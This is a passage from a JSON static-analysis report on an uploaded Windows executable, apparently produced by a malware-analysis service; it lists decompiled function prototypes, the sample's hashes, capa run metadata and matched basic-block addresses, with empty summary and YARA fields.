    "void __fastcall sub_180026158(XSAVE_FORMAT **a1);",
    "wchar_t **__fastcall sub_180026250(__int64 a1, __int64 a2);",
    "void sub_1800262B8();",
    "__int64 sub_1800262FC();",
    "__int64 sub_1800263D0();",
    "__int64 sub_180026474();",
    "__int64 __fastcall sub_18002653C(__int64 a1, __int64 a2);",
    "char sub_1800265FC();",
    "char sub_180026638();",
    "void __fastcall sub_18002665C(__int64 a1, int *a2, _QWORD **a3, int *a4);",
    "void __fastcall sub_180026798(__int64 a1, int *a2, __int64 a3, int *a4);",
    "__int64 __fastcall sub_180026808(__int64 a1, __int64 a2, __int64 a3, __int64 *a4);",
    "void __fastcall sub_180026834(_QWORD **a1);",
    "__int64 __fastcall sub_1800268C4(__int64 a1, __int64 a2, __int64 a3);",
    "LPVOID __fastcall sub_18002693C(__m128i *a1);",
    "void sub_1800269CC();",
    "__int64 __fastcall _lc_lctowcs(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180026AA0(__int64 a1, _WORD *a2);",
    "void __fastcall sub_180026C08(__int64 a1, _OWORD *a2);",
    "__int64 __fastcall sub_180026CC8(char *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, _DWORD *a6);",
    "void __fastcall sub_180027148(__int64 a1, __int64 a2, int a3);",
    "__int64 __fastcall sub_1800271B0(unsigned int a1, __int64 a2);",
    "XSAVE_FORMAT *__fastcall sub_180027254(__int64 a1);",
    "XSAVE_FORMAT *__fastcall sub_180027440(__int64 a1, __int64 a2, _WORD *a3);",
    "__int64 __fastcall wsetlocale_set_cat(_DWORD *a1, int a2, char *a3);",
    "char __fastcall sub_180027A1C(__int64 a1, unsigned __int16 *a2);",
    "char __fastcall sub_180027C18(__int64 a1, __int64 a2);",
    "char __fastcall sub_180027C60(__int64 a1, _QWORD *a2);",
    "char __fastcall sub_180027CEC(__int64 a1, _QWORD *a2);",
    "char __fastcall sub_180027DE0(__int64 a1, _QWORD *a2);",
    "char __fastcall sub_180027E70(__int64 a1, unsigned __int64 a2);",
    "__int64 __fastcall sub_180027EDC(WCHAR a1, unsigned __int16 a2);",
    "__int64 __fastcall sub_180027F48(int a1, int a2, __int128 *a3);",
    "void sub_180028050();",
    "__int64 __fastcall sub_180028064(__int64 a1);",
    "bool __fastcall sub_1800281CC(char a1, __int64 a2, __int64 a3);",
    "bool __fastcall sub_1800282C4(__int64 a1);",
    "__int64 __fastcall sub_180028340(unsigned __int8 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_18002840C(__int64 a1);",
    "__int64 __fastcall sub_180028478(__int64 a1, unsigned int *a2, int **a3, unsigned int *a4);",
    "__int64 __fastcall sub_180028504(int a1);",
    "__int64 __fastcall sub_180028598(__int64 a1, int a2, unsigned __int8 *a3, int a4, __int64 a5);",
    "__int64 __fastcall sub_180028A10(__int64 a1, int a2, char *a3, int a4);",
    "__int64 __fastcall sub_180028B14(__int64 a1, int a2, __int16 *a3, unsigned int a4);",
    "__int64 __fastcall sub_180028C30(__int64 a1, int a2, __int16 *a3, unsigned int a4);",
    "__int64 __fastcall sub_180028DA0(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180028E38(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4);",
    "__int64 __fastcall sub_180028F58(int a1, _BYTE *a2, unsigned int a3, __int64 a4);",
    "__int64 __fastcall sub_180029260(unsigned int a1, __int64 a2, unsigned int a3, __int64 a4);",
    "LARGE_INTEGER __fastcall sub_180029380(unsigned int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4);",
    "__int64 __fastcall sub_18002942C(unsigned int a1, __int64 a2, unsigned int a3);",
    "LARGE_INTEGER __fastcall sub_1800294D0(unsigned int a1, LARGE_INTEGER a2, DWORD a3);",
    "// attributes: thunk",
    "LARGE_INTEGER __fastcall sub_18002956C(unsigned int a1, LARGE_INTEGER a2, DWORD a3, __int64 a4);",
    "__int64 __fastcall sub_180029574(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800295E0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180029730(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_18002988C(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180029A10(_BYTE *a1, _BYTE *a2, char a3);",
    "__int64 __fastcall sub_180029A68(__int64 a1);",
    "// attributes: thunk",
    "__int64 __fastcall sub_180029B04(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180029B0C(signed int a1, __int16 *a2, __int64 a3);",
    "__int64 __fastcall sub_180029CCC(signed int a1, unsigned __int8 *a2, __int64 a3);",
    "__int64 __fastcall sub_180029F94(unsigned int a1, __int64 a2, unsigned int a3);",
    "__int64 __fastcall sub_18002A0B4(int a1, __int16 *a2, DWORD a3);",
    "__int64 __fastcall sub_18002A504(__int64 a1, unsigned int *a2, int **a3, unsigned int *a4);",
    "__int64 __fastcall sub_18002A57C(int a1, __int64 a2);",
    "__int64 __fastcall sub_18002A640(__int64 a1);",
    "__int64 __fastcall sub_18002A6D8(unsigned int a1, __int64 a2);",
    "_QWORD *__fastcall sub_18002A7A8(_QWORD *a1);",
    "__int64 __fastcall sub_18002A800(__int64 a1);",
    "_QWORD *__fastcall sub_18002A81C(_QWORD *a1);",
    "__int64 __fastcall sub_18002A908(",
    "        unsigned __int64 *a1,",
    "        _WORD *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int64 a6);",
    "__int64 __fastcall sub_18002AA28(_WORD *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_18002AC24(unsigned __int64 *a1, _WORD *a2, unsigned __int64 a3, __int64 a4, unsigned __int64 a5);",
    "__int64 __fastcall sub_18002ACCC(",
    "        unsigned __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int64 a6);",
    "__int64 __fastcall sub_18002ADE0(__int64 a1, __int16 *a2, unsigned __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_18002B120(",
    "        unsigned __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        unsigned __int64 a5,",
    "        __int128 *a6);",
    "__int64 __fastcall sub_18002B1D8(__int128 *a1, __int64 a2, LCTYPE a3, int a4, int a5);",
    "__int64 __fastcall sub_18002B354(__int128 *a1, int a2, __int64 a3, LCTYPE a4, LPVOID *a5);",
    "__int64 __fastcall sub_18002B51C(",
    "        __int128 *a1,",
    "        DWORD a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        WORD *lpCharType,",
    "        unsigned int a6,",
    "        int a7);",
    "__int64 __fastcall sub_18002B6AC(",
    "        __int64 a1,",
    "        __int64 a2,",
    "        DWORD a3,",
    "        _BYTE *a4,",
    "        int a5,",
    "        WCHAR *a6,",
    "        int a7,",
    "        unsigned int a8,",
    "        int a9);",
    "__int64 __fastcall sub_18002B9E0(",
    "        __int128 *a1,",
    "        __int64 a2,",
    "        DWORD a3,",
    "        _BYTE *a4,",
    "        int a5,",
    "        WCHAR *a6,",
    "        int a7,",
    "        unsigned int a8,",
    "        int a9);",
    "__int64 __fastcall sub_18002BA78(_WORD *a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_18002BAE0(__int64 a1, char *a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_18002BDA4(int a1, char *a2, __int64 a3, __int64 a4);",
    "LPVOID __fastcall sub_18002BE40(XSAVE_FORMAT *lpMem, M128A *dwBytes);",
    "__int64 __fastcall sub_18002BEBC(__int64 a1, int *a2, __int64 a3, int *a4);",
    "__int64 sub_18002BF04();",
    "void __fastcall initp_misc_winsig(__int64 a1);",
    "__int64 __fastcall sub_18002BF54(unsigned int a1);",
    "int __fastcall sub_18002C1D0(UINT a1, char a2, const CHAR *a3, int a4, WCHAR *a5, int a6);",
    "int __fastcall sub_18002C260(UINT a1, int a2, const WCHAR *a3, int a4, CHAR *a5, int a6, const CHAR *a7, BOOL *a8);",
    "__int64 __fastcall sub_18002C380(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18002C3C8(unsigned __int16 *a1, unsigned __int16 *a2, __int128 *a3);",
    "char sub_18002C54C();",
    "__int64 sub_18002C580();",
    "__int64 __fastcall sub_18002C5C4(const WCHAR *a1, __int64 a2, __int64 a3, UINT a4);",
    "__int64 __fastcall sub_18002C750(__int64 *a1, __int64 *a2);",
    "__int64 __fastcall sub_18002C994(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4);",
    "__int64 __fastcall sub_18002CB18(_BYTE *a1, _BYTE *a2, _QWORD *a3);",
    "// attributes: thunk",
    "__int64 __fastcall sub_18002CE68(__int64 *a1, __int64 *a2);",
    "__int64 __fastcall sub_18002CE70(HMODULE a1, __int64 a2, unsigned int a3);",
    "void __fastcall sub_18002CF94(__int64 a1, int *a2, volatile signed __int32 ****a3, int *a4);",
    "__int64 __fastcall sub_18002D164(UINT a1);",
    "char __fastcall sub_18002D1E4(__int64 a1);",
    "char __fastcall sub_18002D27C(__int64 a1);",
    "__int64 sub_18002D464(UINT a1, char a2, ...);",
    "XSAVE_FORMAT *__fastcall sub_18002D6D4(__int64 a1, volatile signed __int32 **a2);",
    "char sub_18002D78C();",
    "XSAVE_FORMAT *sub_18002D7EC();",
    "__int64 __fastcall sub_18002D808(UINT a1, __int64 a2);",
    "_BOOL8 __fastcall sub_18002DAC8(__int128 *a1, unsigned __int8 a2, int a3, unsigned __int8 a4);",
    "_BOOL8 __fastcall sub_18002DB3C(unsigned __int8 a1);",
    "char sub_18002DB50();",
    "XSAVE_FORMAT *sub_18002DB78();",
    "char *__fastcall sub_18002DC88(XSAVE_FORMAT *a1, unsigned __int64 a2, unsigned __int64 a3);",
    "bool sub_18002DD20();",
    "char __fastcall sub_18002DD48(unsigned __int8 (**a1)(void), unsigned __int8 (**a2)(void));",
    "char __fastcall sub_18002DDDC(__int64 a1, __int64 a2);",
    "bool sub_18002DE24();",
    "void __fastcall sub_18002DE44(__int64 a1);",
    "__int64 __fastcall sub_18002DE4C(__int64 a1);",
    "__int64 sub_18002DE88();",
    "__int64 __fastcall sub_18002DE90(int a1, _WORD *a2, int a3);",
    "__int64 __fastcall sub_18002DF78(__int64 a1);",
    "char *sub_18002E01C();",
    "void __fastcall sub_18002E0C4(XSAVE_FORMAT *lpCriticalSection);",
    "__int64 __fastcall sub_18002E114(unsigned int a1);",
    "void __fastcall sub_18002E1BC(int a1);",
    "__int64 __fastcall sub_18002E1E4(int a1, void *a2);",
    "void __fastcall sub_18002E2A4(int a1);",
    "__int64 sub_18002E2CC();",
    "__int64 __fastcall sub_18002E40C(int a1);",
    "__int64 __fastcall sub_18002E4C8(int a1);",
    "__int64 get_fpsr();",
    "void __fastcall set_fpsr(unsigned int a1);",
    "void fclrf();",
    "void __fastcall sub_18002E5A0(__int64 a1);",
    "void __fastcall sub_18002E62C(__int64 a1);",
    "void __fastcall sub_18002E7CC(__int64 a1);",
    "void __fastcall sub_18002E82C(__int64 a1);",
    "__int64 sub_18002E8D4();",
    "__int64 __fastcall sub_18002E944(__int64 *a1, __int64 a2);",
    "bool __fastcall sub_18002E9AC(char *a1, char *a2, int a3, int a4, int a5);",
    "__int64 __fastcall sub_18002EA7C(_BYTE *a1, unsigned __int64 a2, int a3, __int64 a4, int a5, int a6, __int64 a7);",
    "__int64 __fastcall sub_18002EB8C(unsigned __int64 a1, int a2, int a3, __int64 a4, _BYTE *a5, __int64 a6);",
    "__int64 __fastcall sub_18002FE1C(_BYTE *a1, unsigned int a2, _QWORD *a3);",
    "unsigned __int64 __fastcall sub_18002FEC0(__int16 *a1, int a2, int a3, int a4, __int64 a5);",
    "__int64 __fastcall sub_18002FF04(_WORD *a1, _BYTE **a2, unsigned __int64 a3, int a4, __int64 a5);",
    "int __cdecl isatty(int FileHandle);",
    "void __fastcall _free_lconv_mon(_QWORD *a1);",
    "__int64 __fastcall sub_180030214(unsigned __int64 a1);",
    "void __fastcall _free_lconv_num(XSAVE_FORMAT **a1);",
    "__int64 __fastcall sub_18003079C(unsigned __int64 a1);",
    "void __fastcall sub_180030A84(XSAVE_FORMAT **a1, __int64 a2);",
    "bool __fastcall sub_180030AB8(__int64 a1, unsigned __int64 a2);",
    "void __fastcall sub_180030DF8(XSAVE_FORMAT **a1);",
    "__int64 __fastcall sub_180030F00(unsigned __int64 a1);",
    "__int64 __fastcall sub_180030F9C(_WORD *a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180031014(_WORD *a1, __int64 a2, char *a3, __int64 a4);",
    "__int64 __fastcall sub_18003110C(_WORD *a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180031208(_WORD *a1, _WORD *a2);",
    "_WORD *__fastcall sub_180031248(_WORD *a1, _WORD *a2);",
    "__int64 __fastcall sub_18003127C(__int64 a1);",
    "bool __fastcall sub_180031324(__int64 a1);",
    "__int64 __fastcall sub_1800313F4(__int64 a1);",
    "__int64 __fastcall sub_18003148C(__int64 a1);",
    "_BOOL8 __fastcall sub_18003176C(__int64 a1);",
    "int __fastcall sub_180031858(__int16 *a1, __int64 a2);",
    "__int64 __fastcall TestDefaultCountry(_WORD *a1);",
    "__int64 __fastcall TranslateName(__int64 a1, int a2, __int64 *a3);",
    "__int64 __fastcall sub_180031A1C(_WORD *a1, UINT *a2, WCHAR *a3);",
    "__int64 __fastcall CountryEnumProc(__int64 a1);",
    "bool __fastcall sub_180031D78(_DWORD *a1);",
    "BOOL __fastcall sub_180031E48(_DWORD *a1);",
    "__int64 __fastcall sub_180031EE0(__int64 a1);",
    "__int64 __fastcall LanguageEnumProc(__int64 a1);",
    "__int64 __fastcall sub_180032230(unsigned __int16 *a1);",
    "UINT __fastcall ProcessCodePage(__int16 *a1, __int64 a2);",
    "__int64 __fastcall sub_180032330(int a1, int a2);",
    "char __fastcall sub_1800323E4(__int64 a1, int a2, __int64 *a3);",
    "__int64 __fastcall sub_180032464(__int64 a1, UINT *a2, WCHAR *a3);",
    "// attributes: thunk",
    "BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType);",
    "__int64 sub_1800326F8();",
    "__int64 __fastcall sub_180032834(unsigned int a1);",
    "__int64 __fastcall sub_1800329E0(unsigned __int16 a1);",
    "__int64 __fastcall sub_180032A1C(char *a1, unsigned __int16 **a2, unsigned __int64 a3, __int64 a4, __int64 a5);",
    "__int64 __fastcall sub_180032B70(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180032C60(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3);",
    "__int64 __fastcall sub_180032CAC(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3);",
    "__int64 __fastcall sub_180032CF4(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3, __int128 *a4);",
    "__int64 __fastcall sub_180032E94(__int64 a1, __int64 a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_180032EE4(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3, __int128 *a4);",
    "__int64 __fastcall sub_180032F94(__int64 a1, int a2, int a3, int a4, int *a5, int a6);",
    "__int64 __fastcall sub_180033058(unsigned int a1, __int64 a2, int a3, _BYTE *a4);",
    "__int64 __fastcall sub_1800332D8(__int64 a1, int a2, int a3, char a4);",
    "__int64 __fastcall sub_1800334E0(int a1);",
    "__int64 __fastcall sub_1800335A4(__int64 a1, __int64 a2, _BYTE *a3, unsigned int a4, int a5, int a6, int a7);",
    "__int64 __fastcall sub_1800336C0(int *a1, __int64 a2, int a3, int a4, int a5);",
    "__int64 __fastcall sub_1800336F4(_DWORD *a1, int *a2, const WCHAR *a3, int a4, int a5, char a6);",
    "__int64 __fastcall sub_180033AE4(unsigned __int16 a1, __int128 *a2);",
    "void __fastcall sub_180033BE0(",
    "        unsigned __int64 a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        int (__fastcall *a4)(unsigned __int64, _BYTE *));",
    "_BYTE *__fastcall sub_180033FF0(_BYTE *a1, unsigned __int8 *a2);",
    "char *__fastcall sub_180034090(char *a1, unsigned __int8 *a2);",
    "__int64 __fastcall sub_180034458(__int64 a1, __int64 a2);",
    "unsigned __int8 *__fastcall sub_180034460(unsigned __int64 a1, unsigned __int64 a2, __int128 *a3);",
    "_BOOL8 sub_1800344F4();",
    "SIZE_T __fastcall sub_18003450C(const void *a1);",
    "__int64 sub_180034548();",
    "__int64 __fastcall sub_180034550(_DWORD *a1, unsigned int a2, int a3);",
    "int __cdecl fegetenv(fenv_t *Env);",
    "__int64 __fastcall sub_1800345D4(unsigned int *a1);",
    "__int64 __fastcall sub_18003462C(fenv_t *a1);",
    "double __fastcall sub_18003467C(double result);",
    "unsigned __int64 __fastcall sub_180034740(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180034D08(__int64 a1, char *a2, unsigned __int64 a3, unsigned __int8 *a4, __int64 a5);",
    "__int64 __fastcall sub_180034EE4(unsigned int a1, __int16 *a2, unsigned __int64 a3, unsigned int a4, char a5);",
    "__int64 __fastcall sub_180034FC8(",
    "        unsigned int a1,",
    "        __int16 *a2,",
    "        unsigned __int64 a3,",
    "        unsigned int a4,",
    "        unsigned __int8 a5);",
    "__int64 __fastcall sub_180035034(signed int a1, __int16 *a2, unsigned __int64 a3, unsigned int a4);",
    "__int64 __fastcall sub_180035054(char *a1, char *a2);",
    "__int64 sub_18003508C();",
    "BOOL sub_1800350E0();",
    "__int64 __fastcall sub_1800350FC(void *lpBuffer, PCONTEXT nNumberOfCharsToWrite, DWORD *lpNumberOfCharsWritten);",
    "__int64 __fastcall sub_1800351BC(_BYTE *a1, unsigned __int16 a2, _QWORD *a3, __int64 a4);",
    "__int64 __fastcall sub_180035260(_DWORD *a1);",
    "__int64 __fastcall sub_180035290(int a1, int a2);",
    "__int64 __fastcall sub_180035374(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18003540C(unsigned int a1, LARGE_INTEGER a2, __int64 a3);",
    "int __fastcall sub_1800355A0(__int64 a1, DWORD a2, __m128i *a3, int a4, WCHAR *a5, int a6);",
    "__int64 sub_180035628();",
    "// attributes: thunk",
    "__int64 __fastcall sub_180035694(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18003569C(int a1, int a2);",
    "double __fastcall sub_180035938(int a1, __int64 a2, __int64 a3, double a4, __int64 a5, double a6, __int64 a7);",
    "_BOOL8 __fastcall sub_1800359A0(char a1, __int16 a2);",
    "double __fastcall sub_180035A5C(",
    "        __int64 a1,",
    "        int a2,",
    "        __int64 a3,",
    "        int a4,",
    "        int a5,",
    "        unsigned int a6,",
    "        double a7,",
    "        __int64 a8,",
    "        __int64 a9);",
    "__int64 sub_180035BA0();",
    "__int64 __fastcall sub_180035C10(int a1, int a2, int a3);",
    "// local variable allocation has failed, the output may be wrong!",
    "__m128 __fastcall sub_180035C30(double a1, double a2, int a3, int a4, __int64 a5);",
    "__int64 __fastcall IsNonwritableInCurrentImage(__int64 a1);",
    "_BOOL8 __fastcall sub_180035D90(__int64 a1);",
    "EXCEPTION_DISPOSITION __fastcall _GSHandlerCheck_SEH(",
    "        struct #70 *ExceptionRecord,",
    "        void *EstablisherFrame,",
    "        struct #55 *ContextRecord,",
    "        struct _DISPATCHER_CONTEXT *DispatcherContext);",
    "__int64 __fastcall _GSHandlerCheck_EH(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "void __fastcall sub_180035EC4(void *a1, void *a2);",
    "EXCEPTION_DISPOSITION __fastcall _C_specific_handler_noexcept(",
    "        __int64 a1,",
    "        void *a2,",
    "        struct #55 *a3,",
    "        struct _DISPATCHER_CONTEXT *a4);",
    "__m128i *__fastcall sub_180035F3C(__m128i *a1, unsigned __int8 a2);",
    "const __m128i *__fastcall sub_180036074(const __m128i *a1, unsigned __int16 a2);",
    "void __fastcall sub_180036150(void *a1, const void *a2, unsigned __int64 a3);",
    "void __fastcall sub_180036160(__m128i *_RCX, const __m128i *_RDX, unsigned __int64 _R8);",
    "__int64 __fastcall sub_1800367E0(const __m128i *a1, unsigned __int8 a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_180036890(void *a1, char a2, unsigned __int64 a3, __int64 a4);",
    "_OWORD *__fastcall sub_1800368A0(__int64 a1, unsigned __int8 a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_180036C40(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3);",
    "void sub_180036D30();",
    "__int64 __fastcall sub_180036E90(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180036EE9(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180036F10(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180036F80(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800370DC(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180037140(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800371D0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18003727C(__int64 a1, __int64 a2);",
    "__int64 sub_1800372E0();",
    "__int64 __fastcall sub_180037338(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800373DC(__int64 a1, __int64 a2);",
    "void sub_1800374A0();",
    "__int64 __fastcall sub_18003752C(__int64 a1, __int64 a2);",
    "void sub_180037570();",
    "__int64 __fastcall sub_180037618(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18003768C(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180037708(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180037788(__int64 a1, __int64 a2);",
    "void __fastcall  sub_1800377F0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180037894(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180037E0B(__int64 a1, __int64 a2);",
    "void sub_180037F95();",
    "void __fastcall sub_180037FC7(__int64 a1, __int64 a2);",
    "void __fastcall sub_180038060();",
    "void sub_18003806C();",
    "void __fastcall sub_1800380C8();",
    "void __fastcall sub_180038108();",
    "void __fastcall sub_18003815C();",
    "void __fastcall sub_180038168();",
    "void __fastcall sub_180038174();",
    "void __fastcall sub_1800381C8();",
    "void __fastcall sub_1800381D4();",
    "void __fastcall sub_1800381E0();",
    "void __fastcall sub_180038220();"
  ],
  "summary": [],
  "yara_rules": "",
  "capa_rules": {
    "meta": {
      "timestamp": "2025-07-14T01:10:07.237727",
      "version": "9.2.1",
      "argv": [
        "-r",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\services\\CAPA\\capa-rules",
        "-s",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\services\\CAPA\\capa-sigs",
        "--json",
        "D:\\Whitehat\\web\\YARRAI_Web\\backend\\uploads\\dac3cb6d-77e2-4911-a9ef-3518b2c7af74.exe"
      ],
      "sample": {
        "md5": "4e42a438248cd121a8f7dda2787d9bce",
        "sha1": "7ec2d83bf4e5dda8f1c9506e4fa1263dbfd47d3e",
        "sha256": "a2559bd56290c52c0b3c841fbb3ac50c8048be02c2a97983651d47ea19f0cf48",
        "path": "D:/Whitehat/web/YARRAI_Web/backend/uploads/dac3cb6d-77e2-4911-a9ef-3518b2c7af74.exe"
      },
      "flavor": "static",
      "analysis": {
        "format": "pe",
        "arch": "amd64",
        "os": "windows",
        "extractor": "VivisectFeatureExtractor",
        "rules": [
          "D:/Whitehat/web/YARRAI_Web/backend/services/CAPA/capa-rules"
        ],
        "base_address": {
          "type": "absolute",
          "value": 6442450944
        },
        "layout": {
          "functions": [
            {
              "address": {
                "type": "absolute",
                "value": 6442455040
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455040
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455072
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455084
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455096
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455096
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455144
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455144
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455224
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455224
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455280
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455280
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455312
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455312
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455360
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455512
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455512
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455544
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455544
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455576
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442524152
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455712
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455712
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456096
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456096
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456160
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456160
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456256
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456256
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456464
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456464
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456549
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456663
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456693
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456853
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456879
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457024
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457024
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457216
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457216
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457237
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457266
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457308
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457472
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457472
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457536
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457570
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457856
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457856
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442458209
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458256
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442517877
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442517896
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442517977
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442518011
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442518128
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458272
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442458272
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442458330
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
